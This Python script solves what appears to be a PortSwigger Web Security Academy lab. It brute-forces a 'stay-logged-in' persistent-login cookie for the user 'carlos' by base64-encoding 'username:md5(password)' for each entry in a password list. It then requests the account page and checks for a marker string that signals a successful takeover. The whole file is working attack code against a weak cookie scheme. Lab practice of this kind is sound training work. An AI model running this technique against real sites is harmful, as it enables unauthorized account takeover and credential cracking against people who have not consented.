from rich.console import Console
from rich.progress import track
from requests import session
import base64
from hashlib import md5

def try_cookie(lab_url: str, cookie: str):
    with session() as s:
        s.cookies.update({"stay-logged-in": cookie})
        if "Update email" in s.get(f"{lab_url}/my-account?id=carlos").text:
            return True
        return False


def get_encoded_cookie(username: str, password: str):
    return base64.b64encode(f"{username}:{md5(password.encode()).hexdigest()}".encode())


def main():
    console = Console()
    lab_url = "https://0a6300e503a514fc84d05edf000e0049.web-security-academy.net"
    passwords = []

    # the password is encoded in md5
    with open("passwords.txt", "r") as f:
        for password in f:
            passwords.append(password.strip())

    for password in track(passwords, description="trying passwords"):
        encoded_cookie = get_encoded_cookie("carlos", password)
        if try_cookie(lab_url, encoded_cookie.decode()):
            console.print(f"[bold green] Found password: {password}[/bold green]")


if __name__ == "__main__":
    main()